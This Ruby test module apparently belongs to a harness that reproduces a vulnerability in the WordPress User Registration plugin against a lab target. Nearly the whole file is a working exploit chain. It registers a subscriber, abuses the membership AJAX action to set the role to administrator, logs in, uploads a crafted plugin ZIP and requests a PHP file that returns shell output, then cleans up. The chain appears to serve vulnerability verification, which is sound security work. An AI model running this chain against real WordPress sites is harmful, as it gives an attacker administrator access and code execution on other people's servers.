# frozen_string_literal: true

require 'nokogiri'
require 'rex/mime/message'
require 'rex/zip'
require_relative '../wp_batch_desync_rce/native'

# Reuse bounded commands, reporting and callback controls; replace the
# batch-specific identity and SQLi gates with the genuine membership workflow.
module UserRegistrationNative
  include WordpressBatchChainTarget

  def chain_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-user-registration.json'), JSON.pretty_generate(@chain)) if @chain
  end

  def chain_identity(label, *)
    output, = chain_command(label, 'app', 'php', '/opt/module-target/control.php', *)
    data = JSON.parse(output)
    (@chain[:identities] ||= []) << { label: label, data: data }
    chain_save
    expect(data.values_at('core', 'php', 'uid', 'version', 'database', 'role')).to eq(['6.8.3', '8.3.28', 33, @release, 'wp_root', 'module_target@%'])
    expect(data.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(data.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(data.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    expect(data.fetch('installed_sha256')).to eq(@catalog.fetch('installed_sha256'))
    expect(data.fetch('archive_sha256')).to eq(@catalog.fetch('sha256'))
    expect(data.fetch('active_plugins')).to eq(['user-registration/user-registration.php'])
    expect(data.values_at('membership_active', 'registration_handler', 'membership_handler')).to eq([true, true, true])
    expect(data.fetch('options').values_at('users_can_register', 'prevent_core_login')).to eq(['1', @auth_mode == 'core' ? '0' : '1'])
    %w[plugins upload_base upload_current].each do |key|
      expect(data.fetch('filesystem').fetch(key).values_at('uid', 'writable')).to eq([33, true])
    end
    expect(data.fetch('filesystem').fetch('upload_error')).to be(false)
    expect(data.fetch('filesystem').fetch('disk_free_bytes')).to be > 16_777_216
    expect(data.fetch('plans').length).to eq(1)
    expect(JSON.parse(data.fetch('plans').first.fetch('meta')).fetch('role')).to eq('subscriber')
    data
  end

  def chain_assert_restored(current, original = @baseline)
    keys = original.keys - %w[table_ddl filesystem]
    expect(current.slice(*keys)).to eq(original.slice(*keys))
    normalize = ->(data) { data.fetch('table_ddl').transform_values { |text| text.gsub(/ AUTO_INCREMENT=\d+/, '') } }
    expect(normalize.call(current)).to eq(normalize.call(original))
  end

  def chain_http(label, path, payload = nil, form: false, headers: {})
    request = payload ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request['Host'] = 'module-target.test'
    if payload
      request['Content-Type'] = form ? 'application/x-www-form-urlencoded' : 'application/json'
      request.body = if payload.is_a?(String)
                       payload.b
                     elsif form
                       URI.encode_www_form(payload)
                     else
                       payload.to_json
                     end
    end
    headers.each { |name, value| request[name] = value }
    endpoint = target_endpoint('app')
    connection = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    connection.open_timeout = 5
    connection.read_timeout = 20
    connection.max_retries = 0
    response = connection.request(request)
    @chain.fetch(:requests) << { label: label, method: request.method, path: path, headers: request.to_hash, body_base64: Base64.strict_encode64(request.body.to_s.b), code: response.code, response_headers: response.to_hash, response_base64: Base64.strict_encode64(response.body.to_s.b) }
    chain_save
    response
  end

  def ur_localized(document, name)
    text = document.css('script').map(&:text).find { |entry| entry.match?(/\b#{Regexp.escape(name)}\s*=/) }
    expect(text).not_to be_nil
    JSON.parse(text.match(/\b#{Regexp.escape(name)}\s*=\s*(\{.*\});/m)[1])
  end

  def ur_fields(document)
    document.css('input[name]').to_h { |input| [input['name'], input['value'].to_s] }
  end

  def ur_cookies(response)
    Array(response.get_fields('set-cookie')).map { |text| text.split(';', 2).first }.join('; ')
  end

  def ur_login(label, username, password, administrator: true)
    route = @prefix + (@auth_mode == 'core' ? '/wp-login.php' : '/login/')
    response = chain_http(label + '-login-form', route)
    expect(response.code).to eq('200')
    fields = ur_fields(Nokogiri::HTML(response.body))
    if @auth_mode == 'core'
      expect(fields.keys).to include('log', 'pwd')
      parameters = { 'log' => username, 'pwd' => password, 'wp-submit' => 'Log In', 'redirect_to' => @prefix + '/wp-admin/', 'testcookie' => '1' }
    else
      parameters = {
        'username' => username, 'password' => password, 'user-registration-login-nonce' => fields.fetch('user-registration-login-nonce'),
        '_wp_http_referer' => route, 'login' => 'Login', 'redirect' => ''
      }
    end
    response = chain_http(label + '-password-login', route, parameters, form: true, headers: { 'Cookie' => ur_cookies(response) })
    expect(response.code).to eq('302')
    cookie = ur_cookies(response)
    expect(cookie).to match(/wordpress_logged_in_[^=]+=.+/)
    response = chain_http(label + '-admin-page', @prefix + '/wp-admin/users.php', headers: { 'Cookie' => cookie })
    expect(response.code).to eq(administrator ? '200' : '403')
    expect(response.body).to include(username) if administrator
    cookie
  end

  def chain_native_gate(phase)
    original = chain_identity(phase + '-identity')
    expect(chain_http(phase + '-home', @prefix + '/').code).to eq('200')
    readme = chain_http(phase + '-readme', @prefix + '/wp-content/plugins/user-registration/readme.txt')
    expect(readme.code).to eq('200')
    expect(readme.body).to include(@release)
    response = chain_http(phase + '-membership-form', @prefix + '/membership-registration/')
    expect(response.code).to eq('200')
    document = Nokogiri::HTML(response.body)
    fields = ur_fields(document)
    radio = document.at_css('input[data-name^="membership_field_"]')
    expect(radio).not_to be_nil
    params = ur_localized(document, 'user_registration_params')
    members = ur_localized(document, 'ur_membership_frontend_localized_data')
    username = 'native_membership_probe'
    password = 'Module-target-membership+2026!'
    values = [
      ['user_login', username, 'text'], ['user_email', 'native-membership@example.test', 'email'],
      ['user_pass', password, 'password'], ['user_confirm_password', password, 'password'],
      [radio['data-name'], radio['value'], 'radio']
    ].map { |name, value, type| { field_name: name, value: value, field_type: type, label: name } }
    response = chain_http(phase + '-register', @prefix + '/wp-admin/admin-ajax.php', {
      action: 'user_registration_user_form_submit', security: params.fetch('user_registration_form_data_save'), form_data: values.to_json,
      form_id: fields.fetch('ur-user-form-id'), registration_language: fields.fetch('ur-registration-language'),
      ur_frontend_form_nonce: fields.fetch('ur_frontend_form_nonce'), is_membership_active: radio['value'], membership_type: radio['value']
    }, form: true)
    expect([response.code, JSON.parse(response.body).fetch('success')]).to eq(['200', true])
    registered = chain_identity(phase + '-registered', 'password', username, password)
    expect(registered.fetch('users').find { |user| user['user_login'] == username }.fetch('roles')).to eq(['subscriber'])
    expect(registered.fetch('password_check').fetch('valid')).to be(true)
    response = chain_http(phase + '-override', @prefix + '/wp-admin/admin-ajax.php', {
      action: 'user_registration_membership_register_member', security: members.fetch('_nonce'),
      members_data: { membership: radio['value'], total: '0', payment_method: 'free', start_date: Time.now.utc.strftime('%Y-%m-%d'), username: username, role: 'administrator' }.to_json,
      form_response: { username: username, success_message_positon: '1', form_login_option: '0', redirect_timeout: 2000, registration_type: 'membership' }.to_json
    }, form: true)
    expect([response.code, JSON.parse(response.body).fetch('success')]).to eq(['200', true])
    promoted = chain_identity(phase + '-role', 'password', username, password)
    user = promoted.fetch('users').find { |entry| entry['user_login'] == username }
    expect(user.values_at('roles', 'install_plugins')).to eq([[@affected ? 'administrator' : 'subscriber'], @affected])
    expect(promoted.fetch('password_check').fetch('valid')).to be(true)
    cookie = ur_login(phase + '-native', username, password, administrator: @affected)
    upload = chain_http(phase + '-upload-form', @prefix + '/wp-admin/plugin-install.php?tab=upload', headers: { 'Cookie' => cookie })
    if @affected
      expect(upload.code).to eq('200')
      expect(chain_http(phase + '-probe-absent', @prefix + '/wp-content/plugins/native_membership_probe/native-proof.php').code).to eq('404')
      source = File.binread(File.join(__dir__, 'probe-plugin.php'))
      archive = Rex::Zip::Archive.new
      archive.add_file('native_membership_probe/native-proof.php', source)
      multipart = Rex::MIME::Message.new
      multipart.add_part(ur_fields(Nokogiri::HTML(upload.body)).fetch('_wpnonce'), nil, nil, 'form-data; name="_wpnonce"')
      multipart.add_part(archive.pack, 'application/zip', 'binary', 'form-data; name="pluginzip"; filename="native-membership.zip"')
      multipart.add_part('Install Now', nil, nil, 'form-data; name="install-plugin-submit"')
      uploaded = chain_http(phase + '-upload', @prefix + '/wp-admin/update.php?action=upload-plugin', multipart.to_s, headers: { 'Cookie' => cookie, 'Content-Type' => 'multipart/form-data; boundary=' + multipart.bound })
      expect(uploaded.code).to eq('200')
      proof = chain_http(phase + '-native-execution', @prefix + '/wp-content/plugins/native_membership_probe/native-proof.php')
      expect(proof.code).to eq('200')
      data = JSON.parse(proof.body)
      expect(data.values_at('marker', 'uid', 'bash')).to eq(['MODULE_TARGET_NATIVE_MEMBERSHIP_PROOF', 33, true])
      expect(data.fetch('shell')).to start_with('uid=33(')
      chain_identity(phase + '-remove-native-plugin', 'delete-plugin', Digest::SHA256.hexdigest(source))
    else
      expect(upload.code).to eq('403')
    end
    chain_assert_restored(chain_identity(phase + '-native-cleanup', 'delete', username), original)
    callback = chain_callback_probe
    chain_resources(phase, %w[app db reporting_db])
    @chain.fetch(:controls) << { phase: phase, authentication: @auth_mode, genuine_native_administrator: @affected, genuine_native_php_and_shell: @affected, passed: true }
    chain_save
    [original, callback]
  end
end
